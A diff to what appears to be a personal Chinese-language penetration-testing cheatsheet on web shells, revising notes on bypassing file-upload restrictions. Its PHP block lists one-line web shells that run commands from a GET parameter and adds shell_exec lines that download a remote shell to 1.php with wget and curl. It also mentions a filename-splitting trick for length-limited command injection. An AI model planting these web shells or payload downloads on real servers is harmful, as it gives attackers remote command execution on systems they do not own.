@@ -15,11 +15,7 @@
 * 下載 shell  
 2. 繞過上傳限制 進行上傳  
 * 直接上傳  
-* 繞過client端  
-* 繞過server端文件類型限制  
-* 繞過mime類型  
-* 繞過文件類型檢測  
-* 過濾不全   
+* 繞過 
    
 ### Webshell cheatsheet
 ```php
@@ -30,16 +26,16 @@
 <?=`$_GET[1]`;                   // <?= is used to shorten the <?php echo `blah`;
 <?php shell_exec('echo 1>1');        // 1=echo 1>1
 <?php shell_exec('>1');            // 1=>1
-<?php shell_exec('wget url -O 1.php');    // download shell
 
-// 長度限制 
-// 思路1:
-// 將cmd分開變成檔名 -> 將ls -t的結果保存在sh檔 -> sh ./file
-// reference: 七字短shell
->wge\\
->t\ \\       // 換行符不會影響命令執行, 空白 特殊符號就用\\轉譯
+<?php shell_exec('wget -O 1.php url');    // download shell
+<?php shell_exec('curl -o 1.php url');    // 預設下載index.html
 ```
-[system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
+長度限制思路：  
+* 用檔名拼湊成命令,再一次ls進一個shell script  
+  [detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)
+* 待續...
+
+[system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
 
 ### SQL inj to webshell
 MYSQL:  
